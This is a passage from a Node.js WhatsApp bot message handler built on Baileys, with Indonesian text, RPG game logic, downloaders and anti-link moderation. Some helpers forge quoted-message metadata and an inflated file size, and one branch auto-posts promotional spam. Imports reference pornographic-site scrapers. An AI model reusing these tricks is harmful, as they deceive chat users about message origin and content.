process.on('uncaughtException', console.error)
require('./setting')
const {
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageContent,
  generateWAMessage,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType
} = global.baileys
const {
  generateWAMessageFromContent,
  proto,
  prepareWAMessageMedia,
  URL_REGEX
} = require("@whiskeysockets/baileys")
const fs = require('fs')
const path = require("path");
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const speed = require('performance-now')
const axios = require('axios')
const fsx = require('fs-extra')
const FormData = require('form-data')
const zsExtract = require('zs-extract')
const gtts = require('node-gtts')
const nou = require("node-os-utils");
const ytdl = require("ytdl-core")
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const yts2 = require('./lib/scrape/yt-search')
const yts = require("yt-search")
const scp2 = require('./lib/scrape/scraperr')
const { uptotelegra } = require('./lib/upload')
const textpro = require('./lib/scrape/textpro')
const githubstalk = require('./lib/scrape/githubstalk')
const npmstalk = require('./lib/scrape/npmstalk')
const anon = require('./lib/scrape/menfess')
const { realistic } = require('./lib/scrape/diffusion')   
const uploadImage = require('./lib/uploadImage.js')
const uploadFile = require('./lib/uploadFile.js')
const skyu = require('./lib/scrape/skyuu')
const cheerio = require('cheerio');
const ms = require("ms");
const scpBcl = require('@bochilteam/scraper')
const { stickerTelegram } = require('@bochilteam/scraper')
const { latinToAksara } = require('@bochilteam/scraper')
const { aksaraToLatin } = require('@bochilteam/scraper')
const { chord } = require('@bochilteam/scraper')
const jsobfus = require('javascript-obfuscator')
const ntilink = JSON.parse(fs.readFileSync("./lib/scrape/antilink.json"))
const crypto = require('crypto')
const https = require('https')
const xfar = require('xfarr-api')
const dylux = require('api-dylux')
const tkApi = require('@tobyg74/tiktok-api-dl')
const moment = require('moment-timezone')
const dann = require('d-scrape')
const { Client } = require('ssh2');
const API_TOKEN = global.apitokendo;
const LINODE_API_TOKEN = global.apilinode;
const { uploadToImgBB, uploadToFileio } = require('./lib/upimg.js')

const {
  fileTypeFromBuffer
} = require('file-type')
const {
  exec,
  spawn,
  execSync
} = require("child_process")
const {
  addResponList,
  delResponList,
  isAlreadyResponList,
  isAlreadyResponListGroup,
  sendResponList,
  updateResponList,
  getDataResponList
} = require('./lib/scrape/addlist');
const {
  searchBokepindo,
  ChatBotz,
  gptPictures,
  tiktokdl,
  aioall,
  streamBokepindo,
  generateGpt,
  hentaivid,
  hentai,
  generateImages,
  pixivDl,
  Draw,
  bingimage,
  bingsearch,
  lookup,
  streamToBuffer,
  ephoto,
  processing,
  igdl3,
  GoogleBardApi,
  sfileDl,
  checkWeb,
  html2img,
  GoogleBard,
  spek,
  speklengkap,
  moewallsSearch,
  txt2imgApi,
  moewallsUrl,
  formatUptime,
  formatBytes,
  rmbg,
  igstalk,
  igdl2,
  stickersearch,
  amv1,
  amv2,
  sfileSearch,
  rexdldownload,
  dafontSearch,
  dafontDown,
  remini2,
  jarakkota,
  generateRandomPassword,
  googleImage
} = require('./src/func')
const {
  smsg,
  tanggal,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  formatp,
  parseMention,
  getRandom,
  getGroupAdmins
} = require('./lib/myfunc')
const {
  FajarNews,
  BBCNews,
  metroNews,
  CNNNews,
  iNews,
  KumparanNews,
  TribunNews,
  DailyNews,
  DetikNews,
  OkezoneNews,
  CNBCNews,
  KompasNews,
  SindoNews,
  TempoNews,
  IndozoneNews,
  AntaraNews,
  RepublikaNews,
  VivaNews,
  KontanNews,
  MerdekaNews,
  KomikuSearch,
  AniPlanetSearch,
  KomikFoxSearch,
  KomikStationSearch,
  MangakuSearch,
  KiryuuSearch,
  KissMangaSearch,
  KlikMangaSearch,
  PalingMurah,
  LayarKaca21,
  AminoApps,
  Mangatoon,
  WAModsSearch,
  Emojis,
  CoronaInfo,
  JalanTikusMeme,
  Cerpen,
  Quotes,
  Couples,
  Darkjokes
} = require("dhn-api");
//=================================================//
module.exports = RezzHost = async (RezzHost, m, chatUpdate, store) => {
  const {
    sender,
    isGroup
  } = m
  try {
    if (global.db.data == null) await loadDatabase()
    require('./src/schema')(m);
    var chats = global.db.data.chats[m.chat],
        users = global.db.data.users[m.sender]
        settings = global.db.data.settings
    var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
    var budy = (typeof m.text == 'string' ? m.text : '')
    const isCreator = [RezzHost.decodeJid(RezzHost.user.id), ...global.rowner.map(([number]) => number), ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
    //=================================================//
    function getFormattedDate() {
      var currentDate = new Date();
      var day = currentDate.getDate();
      var month = currentDate.getMonth() + 1;
      var year = currentDate.getFullYear();
      var hours = currentDate.getHours();
      var minutes = currentDate.getMinutes();
      var seconds = currentDate.getSeconds();
    }
    var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

function pickMoji(list) {
     return list[Math.floor(Math.random() * list.length)]
  }

async function falseR () {
RezzHost.sendReact(m.chat, '❌', m.key)
}

async function loading () {
var nedd = [
"*[ ⚀ ] Loading.*\n_*▰▰▱▱▱▱▱▱▱▱*_", 
"*[ ⚁ ] Loading..*\n_*▰▰▰▰▱▱▱▱▱▱*_", 
"*[ ⚂ ] Loading...*\n_*▰▰▰▰▰▰▱▱▱▱*_", 
"*[ ⚃ ] Loading.*\n_*▰▰▰▰▰▰▰▰▱▱*_", 
"*[ ⚄ ] Loading..*\n_*▰▰▰▰▰▰▰▰▰▱*_",
"*[ ⚅ ] Loading...*\n_*▰▰▰▰▰▰▰▰▰▰*_",
"Loading Completed *[ ✓ ]*"
]
let { key } = await RezzHost.sendMessage(m.chat, {text: 'L O A D I N G . . .'})

for (let i = 0; i < nedd.length; i++) {
await delay(10)
await RezzHost.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}

function monospace(string) {
return '```' + string + '```'
}
    //=================================================//
    let prefix;
let commandnya; {
  prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '';
  commandnya = body.startsWith(prefix) ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
} 
let command = (m.key.fromMe || global.rowner.includes(m.sender)) ? commandnya : body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();

    const args = body.trim().split(/ +/).slice(1)
    const botNumber = await RezzHost.decodeJid(RezzHost.user.id)
    const text = q = args.join(" ")
    const pushname = m.pushName || "No Name"
    const {
      type,
      quotedMsg,
      mentioned,
      now,
      fromMe
    } = m
    const nomore = m.sender.replace(/[^0-9]/g, '')
    const quoted = m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    const isMedia = /image|video|sticker|audio/.test(mime)
    const from = mek.key.remoteJid
    const groupMetadata = m.isGroup ? await RezzHost.groupMetadata(from).catch(e => {}) : ''
    const groupName = m.isGroup ? groupMetadata.subject : ''
    const participants = m.isGroup ? await groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
    const qtod = m.quoted? "true":"false"
    const welcm = m.isGroup ? wlcm.includes(from) : false
    const jangan = m.isGroup ? ntilink.includes(m.chat) : false	
    //=========================================\\
    //Users
    const isPrem = users.premium
    const isRegistered = users.registered
    //Chats
    const isBan = chats.banned
    const isNsfw = chats.nsfw
    const isAutoDlGc = chats.autodl ? true : false
    //Setting
    const isAutobio = settings.autobio ? true : false
    const isAutoread = settings.autoread ? true : false
    //=========================================\\
    // Image
    const tqtd = fs.readFileSync ('./media/quoted.jpg')
    const hst = fs.readFileSync ('./media/hisoka.jpg')
    const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/scrape/limit");
    //=========================================\\
    
    // DATABASE RPG GAMES
let _limit = JSON.parse(fs.readFileSync('./src/rpg/limit.json'));
let _buruan = JSON.parse(fs.readFileSync('./src/rpg/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/rpg/darah.json'))
let balance = JSON.parse(fs.readFileSync('./lib/balance.json'));
let _petualang = JSON.parse(fs.readFileSync('./src/rpg/inventory.json'))
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('./src/rpg/darah.js')
const { cekInventoryAdaAtauGak } = require('./src/rpg/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('./src/rpg/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit } = require('./src/rpg/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi,kurangGajah, getIkan, getAyam, getKelinci, getDomba,getSapi,getGajah} = require('./src/rpg/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,addIkan,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addInventori, sellBesi, addDm, sellDm, getDm, sellEmas, addFish, sellFish, getFish, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion,getBesi, getEmas, getEmerald,getUmpan,getPotion} = require('./src/rpg/rpg.js')
const isDarah = cekDuluJoinAdaApaKagaDiJson(m.senpder)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
//const isSewa = _sewa.checkSewaGroup(from, sewa)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
const isPetualang = checkPetualangUser(m.sender)
// SETTING USER RPG
let DarahAwal = 100;
const ikan = ['🐟','🐠','🐡']
const enter = '\n'



// FANGSIEN RPG
if (m.isGroup) {
const Fisha = await getMancingIkan(m.sender)
const FishId = await getMancingId(m.sender)
if (Fisha === undefined && FishId === undefined) await addMancingId(m.sender)}

// AUTO SAVE PETUALANG

if(!isPetualang&&!commandnya){
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
await _petualang.push(m.sender)
await addInventoriDarah(m.sender, DarahAwal)
await addInventori(m.sender)
await addInventoriBuruan(m.sender)
await fs.writeFileSync('./src/rpg/inventory.json', JSON.stringify(_petualang))
await addLevelingId(m.sender)
}
// BATAS RPG
    
    
    //=========================================\\
if (isAutobio) {
        let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await RezzHost.updateProfileStatus(`
I am ${botname} | Aktif Selama ${uptime} ⏳ 
| Mode : ${RezzHost.public ? 'Public-Mode' : 'Self-Mode'}
`).catch(_ => _)
        }
if (isAutoread) {
RezzHost.readMessages([m.key])
        }

    
    const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};


    const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
    const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
    const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
    const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
    const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
    if (time2 < "23:59:00") {
      var stime = Styles(`Selamat Tengah Malam`)
    }
    if (time2 < "19:00:00") {
      var stime = Styles(`Selamat Sore`)
    }
    if (time2 < "18:00:00") {
      var stime = Styles(`Selamat Sore`)
    }
    if (time2 < "15:00:00") {
      var stime = Styles(`Selamat Siang`)
    }
    if (time2 < "11:00:00") {
      var stime = Styles(`Selamat Pagi`)
    }
    if (time2 < "05:00:00") {
      var stime = Styles(`Selwmat Pagii`)
    }
    const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
    const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
    const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
    //=================================================//

    if (m.message) {
      RezzHost.sendPresenceUpdate('available', m.chat)
      console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32REZZ BOTZ-MD \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat'), 'args :', chalk.white(args.length))
    }
    //==================================\\
async function botjawab () {
var nedd = [
`Haii✍︎`, 
`Haii kak✍︎`, 
`Haii kak ada✍︎`, 
`Haii kak ada yang✍︎`, 
`Haii kak ada yang bisa✍︎`,
`Haii kak ada yang bisa Aku✍︎`,
`Haii kak ada yang bisa Aku bantu?✍︎`,
`Haii kak ada yang bisa Aku Bantu?\nAtau✍︎`,
`Haii kak ada yang bisa Aku bantu?\nAtau ada✍︎`,
`Haii kak ada yang bisa Aku bantu?\nAtau ada masalah?✍︎`,
`Haii kak ada yang bisa Aku bantu?\nAtau ada masalah?`

]
let { key } = await RezzHost.sendMessage(m.chat, {text: 'Loading...'}, {quoted: fconver })

for (let i = 0; i < nedd.length; i++) {
await delay(50)
await RezzHost.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
    const fverif = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `0@s.whatsapp.net` } : {}),
      },
      message: {
        extendedTextMessage: {
          text: body,
          title: `Hmm`,
          jpgThumbnail: fs.readFileSync("./media/quoted.jpg"),
        },
      },
    };
    
    const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
    
    const kalgans = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: idsal,
    newsletterName: wm,
    caption: body
}}
}
    async function reply(teks) {
            const po = {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: wm,
                            body: botname,
                            thumbnailUrl: tumburl,
                            sourceUrl: saluran,
                            mediaType: 1,
                            renderLargerThumbnail: true
                    }
                },
                text: teks
            };
            return RezzHost.sendMessage(m.chat, po, { quoted: kalgans }
            );
        };
        
    const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
    
    const reply2 = async(teks) => {RezzHost.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:kalgans})}
    
    const reply3 = (teks) => {
RezzHost.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: wm,
mimetype: 'application/msword',
jpegThumbnail:fs.readFileSync("./media/thumbdoc.jpg"),
caption: `\n${teks}`,
}, { quoted: kalgans,ephemeralExpiration: 86400});
}

const sendmes = (hua, teks) => {
RezzHost.sendMessage(hua, {
document: fs.readFileSync("./lib/scrape/jomok.js"),
fileName: `${stime}`,
caption: teks,
mimetype: 'application/html',
headerType: 9,
jpegThumbnail:fs.readFileSync("./media/thumbdoc.jpg"),
contextInfo:{
mentionedJid: [m.sender],
    externalAdReply:{
title: Styles('R E Z Z - B O T'),
body: Styles('REZZ BOTZZ'),
thumbnailUrl: "https://telegra.ph/file/948927f0a7434a8d1ad25.jpg",
showAdAttribution: true,
renderLargerThumbnail: true,
mediaType:1,
"MediaUrl": gr,
sourceUrl: saluran,
}}}, { quoted: kalgans,ephemeralExpiration: 86400});
}

const sendres = (huhu, teks) => {
RezzHost.sendMessage(huhu, {
document: fs.readFileSync('./media/quoted.jpg'),
fileName: `${stime}`,
mimetype: "image/png",
fileLength: 99999999999,
jpegThumbnail: fs.readFileSync('./media/quoted.jpg'),
description: 'hello',
caption: teks,
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: wm,
newsletterJid: global.idsal},
externalAdReply: { 
title: wm, 
body: `Online On ${runtime(process.uptime())}`,
jpegThumbnail: fs.readFileSync('./media/quoted.jpg'),
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true }}},
{quoted: fcall})}

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
if (!users) continue
let afkTime = users.afkTime
if (!afkTime || afkTime < 0) continue
let reason = users.afkReason || ''
reply2(`
*[ USER IN AFK MODE ]*

➣ Selama ${clockString(new Date - afkTime)}
➣ ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
`.trim())
}
if (users.afkTime > -1) {
reply2(`
*[ USER STOP AFK ]*

➣ Selama ${clockString(new Date - users.afkTime)}
➣ ${users.afkReason ? ' dengan alasan ' + users.afkReason : ''}
`.trim())
users.afkTime = -1
users.afkReason = ''
}

msToDate = (ms) => {
  let years = Math.floor(ms / (1000 * 60 * 60 * 24 * 365));
  let months = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 365)) / (1000 * 60 * 60 * 24 * 30)
  );
  let weeks = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 30)) / (1000 * 60 * 60 * 24 * 7)
  );
  let days = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 7)) / (1000 * 60 * 60 * 24)
  );
  return `${years} tahun ${months} bulan ${weeks} minggu ${days} hari`;
};

msToDay = (ms) => {
  let temp = ms;
  let years = Math.floor(temp / (365 * 24 * 60 * 60 * 1000));
  temp = temp % (365 * 24 * 60 * 60 * 1000);
  let months = Math.floor(temp / (30 * 24 * 60 * 60 * 1000));
  temp = temp % (30 * 24 * 60 * 60 * 1000);
  let weeks = Math.floor(temp / (7 * 24 * 60 * 60 * 1000));
  temp = temp % (7 * 24 * 60 * 60 * 1000);
  let days = Math.floor(temp / (24 * 60 * 60 * 1000));
  temp = temp % (24 * 60 * 60 * 1000);
  let hours = Math.floor(temp / (60 * 60 * 1000));
  temp = temp % (60 * 60 * 1000);
  let minutes = Math.floor(temp / (60 * 1000));
  temp = temp % (60 * 1000);

  let result = "";
  if (years > 0) {
    result += years + (years > 1 ? " tahun " : " tahun ");
  }
  if (months > 0) {
    result += months + (months > 1 ? " bulan " : " bulan ");
  }
  if (weeks > 0) {
    result += weeks + (weeks > 1 ? " minggu " : " minggu ");
  }
  if (days > 0) {
    result += days + (days > 1 ? " hari " : " hari ");
  }
  if (hours > 0) {
    result += hours + (hours > 1 ? " jam " : " jam ");
  }
  if (minutes > 0) {
    result += minutes + (minutes > 1 ? " menit " : " menit ");
  }
  return result.trim();
};

    async function checkBandwidth() {
      let ind = 0;
      let out = 0;
      for (let i of await require("node-os-utils").netstat.stats()) {
        ind += parseInt(i.inputBytes);
        out += parseInt(i.outputBytes);
      }
      return {
        download: formatp(ind),
        upload: formatp(out),
      };
    }
    async function dellCase(filePath, caseNameToRemove) {
      fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
          console.error('Terjadi kesalahan:', err);
          return;
        }
        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');
        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
          if (err) {
            console.error('Terjadi kesalahan saat menulis file:', err);
            return;
          }
          console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
      });
    }
    const downloadMp4 = async (Link) => {
      try {
        await ytdl.getInfo(Link)
        let mp4File = getRandom('.mp4')
        console.log(color('Download Video With ytdl-core'))
        let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
          await RezzHost.sendMessage(from, {
            video: fs.readFileSync(mp4File),
            gifPlayback: false
          }, {
            quoted: kalgans
          })
          fs.unlinkSync(`./${mp4File}`)
        })
      } catch (err) {
        m.reply(`${err}`)
      }
    }
    const downloadMp3 = async (Link) => {
      try {
        await ytdl.getInfo(Link)
        let mp3File = getRandom('.mp3')
        console.log(color('Download Audio With ytdl-core'))
        ytdl(Link, {
          filter: 'audioonly'
        }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
          await RezzHost.sendMessage(from, {
            audio: fs.readFileSync(mp3File),
            mimetype: 'audio/mp4'
          }, {
            quoted: kalgans
          })
          fs.unlinkSync(mp3File)
        })
      } catch (err) {
        m.reply(`${err}`)
      }
    }

const hitsnya = () => {
                settings.hitstat += 1
            }
            hitsnya()
 
const hituser = () => {
                users.hit += 1
            }
            hituser()           
try {
ppuser = await RezzHost.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

// Anti Link
let teksjpm = `*MASUK MAS, SERING BAGI BAGI PANEL*\n\n${gr}`;
if (chats.autojpm) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply2(`${teksjpm}_`)
let gclink = (`https://chat.whatsapp.com/`+await RezzHost.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return RezzHost.sendMessage(m.chat, {text: `${teksjpm}`})
if (isAdmins) return RezzHost.sendMessage(m.chat, {text: `${teksjpm}`})
await RezzHost.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
}) 
}
}

// FUNCTION ANTILINK ANTI PROMOSI
if (chats.antilinkgc && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`chat.whatsapp.com`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`hem hem izin dulu atmin (っ˘̩╭╮˘̩)っ`)
}
if (chats.antilink && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada link ಠ︵ಠ`)
}
if (chats.antilink && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`.com`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada link ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`Rp. 1k`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`Rp 1k`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`Rp. 1.000`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`Rp 1.000`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`Rp. 1000`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`Rp. 5k`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`Rp. 5000`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`lagi promo`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`minat pm`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (chats.antipromosi && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`panel 5k pm`)) {
await RezzHost.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada promosi ಠ︵ಠ`)
}
if (isCreator || isPrem) {
    } else {
      if (opts['pconly'] && m.chat.endsWith('g.us')) {
        return m.reply(`@${m.sender.split('@')[0]} Maaf kak bot sedang di set pconly silahkan chat di private message`);
    }
      if (opts['gconly'] && !m.chat.endsWith('g.us')) {
        return m.reply(`@${m.sender.split('@')[0]} Maaf kak bot sedang di set gconly silahkan join group bot`);
      }
    }

 if (chats.antibot && !isCreator && !isAdmins) {
    if (m.isBaileys && m.fromMe == false){
        if (!isAdmins || !isBotAdmins){		  
        } else {
          reply(`*[ System Notice ]* bot detected`)
    return await RezzHost.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
}


function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}


//GAME
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}

// GAME TEBAK GAMBAR 
if ((from in tebakgambar2)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar2[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar2[from].jawaban}*`);
delete tebakgambar2[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 150`);
RezzHost.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
users.balance += 150
clearTimeout(waktu);
delete tebakgambar2[from];
